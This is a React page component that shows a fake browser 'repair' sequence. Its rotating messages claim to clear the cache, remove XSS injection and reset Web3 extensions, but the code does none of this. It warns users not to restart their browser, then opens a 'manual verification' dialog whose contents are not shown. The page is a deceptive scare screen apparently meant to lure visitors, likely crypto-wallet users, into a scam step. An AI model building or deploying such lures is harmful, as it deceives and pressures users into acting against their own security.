import clsx from "clsx";
import { useEffect, useRef, useState } from "react";
import ManualVerificationDialog from "../components/home/ManualVerificationDialog";

export default function HomePage() {
  const steps = [
    "Processing",
    "Clearing browser cache",
    "Checking for XSS Injection",
    "Removing XSS Injection",
    "Updating Javascript package",
    "Updating WebRTC",
    "Resetting Web3 Extensions",
  ];

  const [index, setIndex] = useState(0);
  const [open, setOpen] = useState(false);
  const timer = useRef<number | null>(null);
  const container = useRef<HTMLDivElement | null>(null);

  useEffect(() => {
    timer.current = window.setInterval(() => {
      setIndex((prev) => (prev + 1) % steps.length);
    }, 2000);

    return () => {
      if (timer.current) window.clearInterval(timer.current);
    };
  }, []);

  useEffect(() => {
    if (container.current) {
      const stepHeight = container.current.scrollHeight / steps.length;
      container.current.scrollTo({
        top: index * stepHeight,
        behavior: "smooth",
      });

      if (index === steps.length - 1) setOpen(true);
    }
  }, [index]);

  return (
    <>
      <main className="flex-1 flex flex-col items-center justify-center">
        <div className="flex-1 flex flex-col items-center justify-center space-y-4">
          <div
            ref={container}
            className="flex flex-col text-center transition-all max-h-13 overflow-y-scroll"
          >
            {steps.map((step, stepIndex) => {
              const current = stepIndex === index;
              return (
                <p
                  key={stepIndex}
                  className={clsx(
                    current
                      ? "font-bold bg-gradient-to-r from-blue-500 to-pink-500 text-transparent bg-clip-text"
                      : stepIndex === index - 1
                      ? "text-xs opacity-25"
                      : "text-xs opacity-10"
                  )}
                >
                  {step}
                </p>
              );
            })}
          </div>
          <div className="w-6 h-6 border-3 border-t-transparent rounded-full animate-spin border-white" />
        </div>
        <footer className="p-8">
          <small className="text-white/75">
            Do not restart browser or turn off your device.
          </small>
        </footer>
      </main>
      <ManualVerificationDialog
        open={open}
        setOpen={(value) => {
          setOpen(value);
          setIndex(0);
        }}
      />
    </>
  );
}
